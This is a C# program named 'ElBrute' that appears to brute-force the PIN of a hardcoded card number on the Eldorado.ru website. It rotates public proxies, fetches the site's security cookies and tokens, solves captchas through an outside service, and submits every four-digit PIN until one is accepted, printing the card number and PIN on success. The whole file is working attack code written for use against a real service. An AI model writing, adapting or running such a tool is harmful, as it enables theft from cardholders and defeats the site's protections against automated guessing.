using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using HtmlAgilityPack;
using xNet;

namespace ElBrute
{
    internal static class Program
    {
        private static readonly object _consoleLocker = new object();
        private static List<string> _proxy = new List<string>();
        private static List<string> _goodProxy = new List<string>();
        private static readonly List<Thread> ThreadList = new List<Thread>();
        private static int _scoreProxy = 0;
        private static int _scoreCode = 0;
        private static int _countThreads = 0;
        private const string card = "9643780042242413";


        private static void Main(string[] args)
        {
            StartProject();
        }

        private static void StartProject()
        {
            CreateBase();

            if (File.ReadAllLines("pincode.txt").Count() > 1)
            {
                Console.WriteLine("База пинкодов успешно создана");

                int count = File.Exists("goodProxy.txt")
                    ? File.ReadAllLines("goodProxy.txt").Count()
                    : 0;

                if (count < 100)
                    StartCheckProxy();

                else
                    _goodProxy = File.ReadAllLines("goodProxy.txt").ToList();

                if (_goodProxy.Count > 100)
                {
                    File.WriteAllLines("goodProxy.txt", _goodProxy);

                    _scoreProxy = 0;

                    Thread[] threads = new Thread[_countThreads];
                    for (int i = 0; i < threads.Length; i++)
                    {
                        threads[i] = new Thread(new ThreadStart(BruteForce));
                        ThreadList.Add(threads[i]);
                        threads[i].Start();

                        Thread.Sleep(1000);
                    }
                }

                else
                    Console.WriteLine("К сожалению, программа не смогла найти хорошие прокси");
            }
            else
                Console.WriteLine("Не удалось создать базу пинкодов");
        }

        private static void StartCheckProxy()
        {
            _proxy = Request.GetProxy();

            Thread[] threads = new Thread[200];
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i] = new Thread(new ThreadStart(CheckProxy));
                ThreadList.Add(threads[i]);
                threads[i].Start();

                Thread.Sleep(1000);
            }
        }

        private static void CreateBase()
        {
            var badPinCodes = File.Exists("bad.txt")
                ? File.ReadAllLines("bad.txt").ToList()
                : new List<string>();

            if (File.Exists("pincode.txt"))
                File.Delete("pincode.txt");

            var pinCodes = new List<string>();

            for (int i = 0; i < 10000; i++)
            {
                var pin = i.ToString("D4");
                if (i == 3)
                    pinCodes.Add("musa0528");
                
                if (!badPinCodes.Any(x => x.Contains(pin)))
                {
                    pinCodes.Add(pin);
                    //File.AppendAllText("pincode.txt", pin + "\n");
                }
            }
            
            File.WriteAllLines("pincode.txt", pinCodes);
        }

        private static void CheckProxy()
        {
            for (int i = 0; i < _proxy.Count() - 1; i++)
            {
                string response = "";
                string proxy = "";

                lock (_consoleLocker)
                {
                    _scoreProxy++;
                    proxy = _proxy[_scoreProxy];
                }

                try
                {
                    var cookies = new CookieDictionary();
                    var characters = new ReqCharacters()
                    {
                        cookies = cookies,
                        proxy = proxy
                    };

                    response = Request.Get(characters, "https://www.google.com/");
                }
                catch { response = "Bad"; }

                if (response != "Bad")
                {
                    _goodProxy.Add(proxy);
                }
            }
        }

        private static void BruteForce()
        {
            string[] code = File.ReadAllLines("pincode.txt");

            for (int i = 0; i < code.Length; i++)
            {
                string pinCode = "";

                lock (_consoleLocker)
                {
                    _scoreCode++;
                    pinCode = code[_scoreCode];
                }

                CheckPinCode(pinCode);
            }
        }

        private static void DataResult(string result ,string pinCode, string proxy)
        {
            lock (_consoleLocker)
            {
                if (result == "Good")
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Номер карты: " + card + "\nПин-код: " + pinCode);
                    StopThreads("Good");
                }

                else if (result == "Bad")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(pinCode);
                    File.AppendAllText("Bad.txt", pinCode + "\n");
                }

                else if (result == "Error")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(proxy);
                    _goodProxy.Remove(proxy);
                    File.WriteAllLines("goodProxy.txt", _goodProxy);
                }
            }
        }

        private static void StopThreads(string info)
        {
            foreach (Thread thread in ThreadList)
            {
                thread.Abort();
            }

            if (info.Contains("small"))
                StartProject();
        }

        private static void CheckPinCode(string pinCode)
        {
            int checkCountProxy = 0;
            string proxy = "";
            string response = "";

            lock (_consoleLocker)
            {
                _scoreProxy++;
                proxy = _goodProxy[_scoreCode];
            }

            try
            {
                if (checkCountProxy == 30)
                {
                    if (File.ReadAllLines("goodProxy.txt").Count() < 100)
                        StopThreads("small proxy");
                }

                CookieDictionary cookies = new CookieDictionary();
                ReqCharacters characters = new ReqCharacters
                {
                    cookies = cookies,
                    proxy = proxy
                };

                string swpTokenCookie = JSecurity.GetCookie(characters);
                if (swpTokenCookie != null)
                    characters.cookies.Add("swp_token", swpTokenCookie);

                response = Request.Get(characters, "https://www.eldorado.ru");

                if (response.Contains("Bad")) // Проверка на валид прокси
                    throw new Exception("Bad proxy");

                string token = Request.GetToken(characters);

                if (token == "") //Заметил баг, что иногда возвращает ноль
                    throw new Exception("token is null");

                string captcha = Regex.Match(response, "\"key\":\"(.*?)\",").Groups[1].Value;

                string id = Captcha.GetID(captcha);
                string answer;

                while (true)
                {
                    answer = Captcha.GetAnswer(id);

                    if (!answer.Contains("CAPCHA_NOT_READY"))
                        break;
                }

                PostCharacters postCharacters = new PostCharacters
                {
                    cookies = cookies,
                    proxy = proxy,
                    token = token,
                    card = card,
                    code = pinCode,
                    captcha = answer
                };

                response = Request.Post(characters, postCharacters);

                if (response.Contains("Blocked"))
                    throw new Exception("Block");                   

                DataResult(response, pinCode, proxy);
            }
            catch (Exception ex)
            {
                if (ex.Message == "Bad proxy")
                {
                    DataResult("Error", pinCode, proxy);
                    CheckPinCode(pinCode);
                }

                else if (ex.Message == "Token is null")
                {
                    Console.WriteLine("Не удалось получить токен");
                    CheckPinCode(pinCode);
                }

                else if (ex.Message == "Block")
                {
                    CheckPinCode(pinCode);
                }
            }
        }
    }


}
